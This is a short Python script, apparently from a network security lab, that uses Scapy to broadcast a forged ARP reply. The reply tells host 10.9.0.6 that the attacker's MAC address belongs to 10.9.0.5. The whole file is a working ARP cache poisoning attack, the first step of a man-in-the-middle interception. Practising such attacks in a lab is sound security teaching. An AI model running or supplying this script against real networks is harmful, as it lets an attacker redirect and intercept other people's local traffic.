#!/usr/bin/env python3
from scapy.all import *

attacker_mac = get_if_hwaddr("eth0")
victim_ip = "10.9.0.6"   # Host B's IP
target_ip = "10.9.0.5"   # We pretend to be Host A

arp_reply = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(
    op=2,                 # 2 = ARP reply
    hwsrc=attacker_mac,   # Attacker's MAC
    psrc=target_ip,       # Pretend to be 10.9.0.5 (A)
    hwdst="ff:ff:ff:ff:ff:ff",  # Target all
    pdst=victim_ip        # Send to B
)

sendp(arp_reply)
print("[+] Spoofed ARP reply sent to B")
